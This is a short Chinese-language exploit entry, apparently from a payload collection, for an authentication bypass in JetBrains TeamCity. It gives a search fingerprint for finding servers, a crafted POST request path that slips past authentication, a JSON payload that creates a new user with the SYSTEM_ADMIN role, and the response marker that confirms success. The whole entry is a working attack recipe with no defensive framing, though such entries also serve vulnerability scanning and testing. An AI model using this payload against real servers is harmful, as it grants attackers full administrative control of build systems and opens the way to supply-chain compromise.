# JetBrainsTeamCity身份验证绕过漏洞1

JetBrainsTeamCity ｜ 其他 ｜ —
- **指纹**：`body="Log in to TeamCity"`
- **请求**：`POST /hax?jsp=/app/rest/users;.jsp HTTP/2`

**Payload**
```
{"username": "dudesite", "password": "dudesite111", "email": "test111@qq.com", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}
```
- **响应特征**：200 username